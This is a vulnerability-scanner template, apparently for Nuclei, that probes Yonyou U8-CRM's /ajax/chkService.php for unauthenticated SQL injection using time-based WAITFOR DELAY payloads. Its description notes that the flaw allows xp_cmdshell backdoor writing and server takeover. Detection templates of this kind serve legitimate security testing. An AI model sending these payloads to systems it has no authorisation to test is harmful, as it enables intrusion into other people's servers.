id: yonyou-crm-chkService-sqli

info:
  name: Template Name
  author: wangzong
  severity: high
  description: 用友U8-CRM系统 /ajax/chkService.php 文件存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。
  reference:
    - https://github.com/wy876/POC/commit/f8d1c71b95c42a687b5b05af9c38e86b49051ea6
  tags: tags

http:
  - method: GET
    path:
      - "{{BaseURL}}/ajax/chkService.php?Action=chkAccountNumExists&accountNum=1%27;WAITFOR+DELAY+%270:0:3%27--"
      - "{{BaseURL}}/ajax/chkService.php?Action=chkAccountNumExists&accountNum=1%27;WAITFOR+DELAY+%270:0:6%27--"
      - "{{BaseURL}}/ajax/chkService.php?Action=chkAccountNumExists&accountNum=1%27;WAITFOR+DELAY+%270:0:9%27--"
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"